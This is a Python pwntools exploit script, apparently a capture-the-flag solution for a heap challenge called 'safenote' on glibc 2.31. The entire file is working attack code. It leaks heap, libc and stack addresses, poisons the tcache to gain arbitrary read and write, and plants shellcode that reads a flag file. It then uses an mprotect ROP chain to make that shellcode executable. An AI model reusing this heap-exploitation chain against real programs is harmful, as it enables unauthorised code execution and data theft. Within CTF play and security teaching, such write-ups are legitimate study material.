from pwn import *

context.binary = binary = ELF('./safenote', checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)

def create_note(idx, size):
	p.sendlineafter(b'choice: ', b'1')
	p.sendlineafter(b'(0-15): ', str(idx).encode())
	p.sendlineafter(b'(max 0x2f8): ', str(size).encode())

def read_note(idx, delim=b''):
	p.sendlineafter(b'choice: ', b'2')
	p.sendlineafter(b'(0-15): ', str(idx).encode())
	p.recvuntil(b'Data: ' + delim)
	return p.recvline()[:-1]

def edit_note(idx, data):
	p.sendlineafter(b'choice: ', b'3')
	p.sendlineafter(b'(0-15): ', str(idx).encode())
	p.sendafter(b'Data: ', data)

def delete_note(idx):
	p.sendlineafter(b'choice: ', b'4')
	p.sendlineafter(b'(0-15): ', str(idx).encode())


p = process()
#p = remote('pwn.blitzhack.xyz', 9088)

# Leak heap base
create_note(0, 0x60)
heap_base = u64(read_note(0).ljust(8, b'\x00')) - 0x2980
info(f'heap base @ {hex(heap_base)}')

# Build an arbitrary read/write on tcache to
# obtain a more powerful arbitrary read/write
create_note(0, 0x2e0)
create_note(1, 0x2e8)
create_note(2, 0x1f0)

chunk1_base = heap_base + 0x3190
fake_chunk_base = chunk1_base + 0x178

edit_note(0, p64(chunk1_base)*2+p64(chunk1_base+0x180)*2+p64(0)*0x2b+p64(0x460)+p64(chunk1_base+0x10)*2)
edit_note(1, b'\x00'*0x2e0 + p64(0x460))

for i in range(7, 15):
	create_note(i, 0x1f0)

for i in range(7, 15):
	delete_note(i)

delete_note(2)

for i in range(3, 6):
	create_note(i, 0x240)

libc_leak = u64(read_note(4).ljust(8, b'\x00'))
libc.address = libc_leak - 0x1ed060
info(f'libc leak @ {hex(libc_leak)}')
info(f'libc @ {hex(libc.address)}')

delete_note(5)
delete_note(4)

tcache_overwrite = b'\x00'*0x178
tcache_overwrite += p64(0x251)
tcache_overwrite += p64(heap_base+0x40)
edit_note(0, tcache_overwrite)

# Note 3 will now be a pointer to the tcache_perthread struct
create_note(2, 0x240)
create_note(3, 0x240)

# Get allocation on libc environ to bypass stack ASLR
edit_note(3, b'\x00'*0xb8+p64(libc.symbols.environ))
create_note(5, 0xe0)
stack_leak = u64(read_note(5).ljust(8, b'\x00'))
info(f'environ @ {hex(stack_leak)}')

# Place shellcode on heap
shellcode = asm(f'''
	xor edi, edi
	mov eax, 3
	syscall

	lea rdi, [rip+filename]
	xor esi, esi
	mov eax, 2
	syscall

	mov edi, eax
	lea rsi, [rip+flag]
	mov rdx, 0x100
	xor eax, eax
	syscall

	mov edi, 1
	mov edx, eax
	mov eax, 1
	syscall

	xor edi, edi
	mov eax, 60
	syscall

	filename:
		.string "/home/pwn/flag.txt"
	flag:
	''')

edit_note(1, shellcode)

# Execute mprotect ROP chain
POP_RDI = p64(libc.address+0x23b6a)
POP_RSI = p64(libc.address+0x2601f)
POP_RDX_RBX = p64(libc.address+0x15fae6)
POP_RAX = p64(libc.address+0x36174)

edit_note(3, b'\x00'*0xb8+p64(stack_leak-0x208))
create_note(5, 0xe0)

rc = b'A'*0x98
rc += POP_RDI
rc += p64(chunk1_base-0x190)
rc += POP_RSI
rc += p64(0x1000)
rc += POP_RDX_RBX
rc += p64(0x7)*2
rc += p64(libc.symbols.mprotect)
rc += p64(chunk1_base+0x300)

edit_note(5, rc)
flag = p.clean().decode()
success(f'flag: {flag}')
